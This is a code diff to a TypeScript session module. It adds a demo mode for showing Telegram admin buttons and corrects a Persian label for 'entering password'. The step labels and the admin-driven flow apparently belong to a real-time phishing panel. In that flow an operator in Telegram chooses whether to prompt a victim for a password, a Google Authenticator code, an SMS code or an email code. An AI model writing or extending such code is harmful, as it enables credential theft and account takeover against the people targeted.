@@ -298,8 +298,8 @@ export const getSession = (sessionId: string): UserSession | undefined => {
 export const showAdminButtons = async (sessionId: string): Promise<boolean> => {
   try {
     const session = activeSessions.get(sessionId);
-    if (!session || !session.messageId) {
-      console.error("Session or messageId not found:", sessionId);
+    if (!session) {
+      console.error("Session not found:", sessionId);
       return false;
     }
 
@@ -310,6 +310,35 @@ export const showAdminButtons = async (sessionId: string): Promise<boolean> => {
     const adminKeyboard = getAdminKeyboard(sessionId, session);
 
     console.log("🎛️ Showing admin buttons:", adminKeyboard);
+
+    // Check if we're in demo mode
+    if (!validateTelegramConfig()) {
+      console.log("🎭 Demo mode: Would show admin buttons in Telegram");
+      console.log("📝 Message:", updatedMessage);
+      console.log("⌨️ Keyboard:", adminKeyboard);
+
+      // In demo mode, show alert with available options
+      const buttons = adminKeyboard.inline_keyboard
+        .flat()
+        .map((btn) => btn.text)
+        .join(", ");
+      console.log("🎛️ Demo Admin Buttons:", buttons);
+
+      // Simulate admin clicking a button after 5 seconds (for testing)
+      setTimeout(() => {
+        console.log("🎭 Demo: Simulating admin clicking 'Password' button");
+        // You can manually call the callback here for testing
+      }, 5000);
+
+      activeSessions.set(sessionId, session);
+      return true;
+    }
+
+    // Real Telegram mode
+    if (!session.messageId) {
+      console.error("MessageId not found for session:", sessionId);
+      return false;
+    }
 
     await updateTelegramMessage(
       session.messageId,
@@ -666,7 +695,7 @@ const getCurrentStepText = (step: string): string => {
   const stepTexts: { [key: string]: string } = {
     phone_verification: "در انتظار کد تایید شماره",
     waiting_admin: "در انتظار دستور ادمین",
-    auth_password: "وارد کردن ر��ز عبور",
+    auth_password: "وارد کردن رمز عبور",
     auth_google: "وارد کردن کد Google Auth",
     auth_sms: "وارد کردن کد پیامک",
     auth_email: "وارد کردن کد ایمیل",
